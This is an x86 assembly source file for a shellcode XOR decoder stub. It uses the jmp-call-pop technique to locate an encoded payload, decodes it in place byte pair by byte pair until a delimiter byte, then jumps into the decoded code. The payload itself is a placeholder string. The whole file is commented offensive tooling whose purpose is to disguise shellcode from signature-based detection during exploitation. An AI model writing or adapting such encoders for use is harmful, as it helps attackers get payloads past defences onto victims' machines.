global _start

section .text
  _start:
    xor   eax, eax
    xor   ebx, ebx
    xor   ecx, ecx
    xor   edx, edx

    mov   dl, 0x45  ; $dl: the EOF delimiter
    jmp   short call_decoder

  decoder:
    pop   esi ; $esi: shellcode

    ; point $edi to the start of the shellcode
    lea   edi, [esi]

  decode:
    ; fill $bx with the xor byte
    mov   bl, byte [edi + ecx]
    mov   bh, bl

    ; if the current byte is the delimiter
    ; jmp to the decoded shellcode at $esi
    mov   al, dl
    xor   al, bl
    jz    short shellcode

    ; xor the current word
    mov   ax, word [edi + 1 + ecx]
    xor   ax, bx

    ; mov the current word into [$edi]
    ; to overwrite the previous xor byte
    mov   word [edi], ax

    ; each iteration will result in the distance
    ; to the next bytes increasing by 1, increment
    ; $ecx so we can continue to calculate the
    ; correct offsets.
    inc   ecx

    ; process the next chunk
    lea   edi, [edi + 2]
    jmp   short decode

  call_decoder:
    call  decoder
    shellcode: db "shellcode is placed here"
